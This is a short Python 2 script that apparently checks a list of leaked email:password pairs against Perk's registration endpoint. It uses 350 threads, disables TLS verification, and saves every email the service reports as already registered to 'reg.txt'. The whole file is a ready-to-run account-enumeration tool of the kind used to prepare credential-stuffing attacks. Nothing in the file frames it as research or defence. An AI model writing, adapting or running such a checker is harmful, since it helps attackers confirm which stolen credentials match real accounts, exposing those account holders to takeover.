# -*- coding: utf-8 -*-
import requests
import re
import Queue
import random
import codecs
from threading import Thread

requests.packages.urllib3.disable_warnings()

def check(q):
	s = requests.session()
	while True:
		try:
			c = q.get()
			user = c.split(':')[0]
			passw = c.split(':')[1]
			work = False
			s.cookies.clear()
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
				'Accept-Encoding': 'gzip',
				'Content-Type': 'application/x-www-form-urlencoded'
			}
			r = s.post(
						'https://auth.perk.com/register',
						'email={0}&password=WoxGuy321!&password_confirmation=WoxGuy321!&product_identifier=perk_web&utm_source=perk-web'.format(user),
						verify=False,
						headers=headers
					)
			if 'User already exists' in r.text:
				f = open("reg.txt", "a")
				f.write('{0}:{1}\n'.format(user, passw))
				f.close()
				print user, 'works!'
			if 'status' in r.text:
				f = open("checked.txt", "a")
				f.write('{0}:{1}\n'.format(user, passw))
				f.close()
			q.task_done()
		except Exception, e:
			print e
	
def main():
	with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
		users = f.readlines()
	with codecs.open('checked.txt', 'r', encoding='utf-8') as f:
		checked = f.readlines()
		
	queue = Queue.Queue()
	
	for _ in range(int(350)):
		worker = Thread(target=check, args=(queue,))
		worker.start()
	for user in users:
		l = re.findall('^\d+@', user)
		if user not in l:
			if user.strip().split(':')[0].lower() not in ''.join(list(queue.queue)).lower():
				queue.put(user.strip())
			
if __name__ == '__main__':
	main()